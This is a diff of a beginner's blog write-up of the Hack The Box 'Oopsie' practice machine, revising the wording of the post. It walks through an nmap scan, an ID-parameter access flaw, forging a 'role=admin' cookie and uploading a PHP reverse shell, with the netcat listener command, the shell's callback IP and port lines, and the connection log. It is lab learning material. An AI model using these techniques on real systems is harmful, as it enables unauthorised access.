@@ -4,9 +4,9 @@ description: "A complete beginner's walk through the Oopsie box, explained the w
 pubDate: 2026-06-14
 ---
 
-This was the first full Hack The Box machine I finished, and I went in knowing close to nothing. I leaned on a guide when I got stuck, retyped things I didn't understand, and broke the same step a few times before it worked. So this is not an expert teardown. It's the write-up I wish I'd had: every move explained from the ground up, including the one part that cost me a real hour.
+This was the first full Hack The Box machine I finished, and I went in knowing close to nothing except the basics from the level 0 challenges. I leaned on a guide when I got stuck, retyped and searched things I didn't understand, and broke the same step a few times before it worked. 
 
-The whole box comes down to one idea. A web app keeps trusting input it should have checked. Each small slip opens the door to the next one, and by the end you have a shell on the machine.
+So this whole box actually was a website that just trusted whatever resource it got and didn't try to validate it with anything from the server.
 
 ## Step 1: see what's running
 
@@ -24,23 +24,22 @@ Two ports answered:
 |_http-title: Welcome
 ```
 
-Port 22 is SSH, which needs a username and password I don't have. Port 80 is a website. A website gives you something to poke at without a login, so that's where I went.
+First, I tried the ssh port, trying to use generic, or misconfigured passwords to log in however I was hit with a wall. So I decided that I would instead try to use the http port. 
 
 ![nmap scan showing SSH on port 22 and an Apache web server on port 80](/blog/oopsie/01-nmap.png)
 *The scan: two open ports, and the web server is the way in.*
 
 ## Step 2: find the hidden login
 
-The site is a fake car company called MegaCorp Automotive. The visible pages are useless, so I ran the traffic through Burp Suite, which is a proxy that records every request the browser makes. Reading that list, instead of the page, showed a file the site loads but never links to: a login script under `/cdn-cgi/login/`.
+The site is a car company called MegaCorp Automotive. The visible pages are useless, so I ran the traffic through Burp Suite, which is a proxy that records every request the browser makes. I decided to find a login as in the website, it required me to login but I could not find the login redirect on the page so, reading that list, instead of the page, showed a file the site loads but never links to: a login script under `/cdn-cgi/login/`.
 
-That path led to a login page with a **Login as Guest** button. Guest is still a way in, so I took it. It dropped me into a "Repair Management System" with a basic, low-permission view.
+That path led to a login page with a **Login as Guest** button. I first tried simple passwords and usernames like `admin, administrator, root` however none worked. Guest was the only way in, so I took it. It dropped me into a "Repair Management System" with a basic, low-permission view.
 
 ![the login page with a Login as Guest option](/blog/oopsie/02-login-guest.png)
-*A guest login is still a foot in the door.*
 
 ## Step 3: ask for things you're not supposed to see
 
-Inside, the accounts page loaded data based on a number in the address bar:
+I went to click on the Account tab and saw the link and wondered if I could possibly change that if the id actually meant something. 
 
 ```text
 /cdn-cgi/login/admin.php?content=accounts&id=1
@@ -75,16 +74,17 @@ user = 34322
 role = admin
 ```
 
-After a refresh, the admin menu showed up, including an Uploads page. That's the one I wanted.
+After a refresh, the admin menu showed up, including access to the upload page. That's the one I wanted.
 
 ![browser cookies edited so role equals admin, unlocking the admin menu](/blog/oopsie/04-cookie-admin.png)
 *The app trusts a cookie I control, so I just tell it I'm the admin.*
 
+
 ## Step 5: the reverse shell, and the part I got wrong
 
-The admin upload form accepted any file with no checks. A web server like Apache will run a PHP file you give it, so I uploaded a PHP **reverse shell**: a small script that, when run, calls back to my machine and gives me a command line on the target.
+This is where I lost about half an hour, so it's worth slowing down.
 
-This is where I lost an hour, so it's worth slowing down.
+ I spent a lot of time searching about that specific Apache server version looking if there was any known vulnerabilities about that version but I was met with no avail until I found out that the admin upload form accepted any file with no checks. A web server like Apache will run a PHP file you give it, so I uploaded a PHP **reverse shell**: a small script that, when run, calls back to my machine and gives me a command line on the target. I got this file from the guide itself.
 
 A reverse shell is the target connecting *back to me*. That word "reverse" is the entire point. Normally my computer connects to the server. Here I make the server connect to my computer and hand me a shell. So two things have to point at **my** machine, not the target:
 
@@ -128,8 +128,6 @@ nc -lvnp 1234
 $ip   = '10.10.15.244';  // my machine, not the target
 $port = 1234;            // a free port I'm listening on
 ```
-
-One small gotcha: browsing to the `/uploads/` folder directly gives a `403 Forbidden`, but the file still runs if you request it by its full name. The moment the numbers matched and pointed the right way, the listener caught the connection:
 
 ```text
 connect to [10.10.15.244] from 10.129.85.163
